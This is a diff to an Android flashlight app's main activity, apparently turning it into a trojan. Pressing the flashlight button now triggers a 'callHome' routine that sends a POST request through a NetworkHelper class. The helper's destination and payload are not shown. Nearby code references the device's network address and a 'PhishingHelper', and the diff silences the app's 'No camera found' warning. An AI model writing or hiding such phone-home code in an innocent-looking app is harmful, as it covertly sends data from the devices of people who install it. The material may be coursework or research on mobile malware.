@@ -6,7 +6,6 @@ import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.hardware.Camera;
 import android.os.Bundle;
-import android.text.format.Formatter;
 import android.util.Log;
 import android.view.Menu;
 import android.view.MenuItem;
@@ -15,10 +14,6 @@ import android.widget.Button;
 import android.widget.ImageView;
 import android.widget.Toast;
 
-import java.net.InetAddress;
-import java.net.NetworkInterface;
-import java.net.SocketException;
-import java.util.Enumeration;
 
 
 public class MainActivity extends Activity {
@@ -33,6 +28,8 @@ public class MainActivity extends Activity {
     private Camera camera;
     private Context context = this;
     private DBhelper dbHelper;
+    private NetworkHelper networkHelper;
+
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -43,7 +40,7 @@ public class MainActivity extends Activity {
         light = (ImageView) findViewById(R.id.ic_light);
         toggle = (Button)findViewById(R.id.btn_toggle);
         toggle.setText("ON");
-
+        networkHelper = new NetworkHelper();
 
         camera = Camera.open();
         final Camera.Parameters p = camera.getParameters();
@@ -54,11 +51,11 @@ public class MainActivity extends Activity {
             public void onClick(View view) {
                 Log.d("APP: ", "Button clicked");
 
-//                callHome();
+                callHome();
 
 
                 if (!context.getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA_FLASH)) {
-                    Toast.makeText(context, "No camera found ", Toast.LENGTH_LONG).show();
+//                    Toast.makeText(context, "No camera found ", Toast.LENGTH_LONG).show();
                 }
                 if (isFlashlightOn) {
                     Log.d("APP: ", "Flashlight is off");
@@ -79,12 +76,13 @@ public class MainActivity extends Activity {
         });
     }
 
-/*
-    public void callHome(){
-        String data = "Hi, heres my address: " + getAddress();
-        Toast.makeText(context, data, Toast.LENGTH_LONG);
 
-        */
+    public void callHome() {
+        Toast.makeText(this, "Calling home...",Toast.LENGTH_SHORT).show();
+        networkHelper.makePOSTRequest();
+        networkHelper.execute();
+    }
+
 /*  This code is currently not working...
         PhishingHelper phishingHelper = new PhishingHelper(context);
         phishingHelper.insert(getAddress());
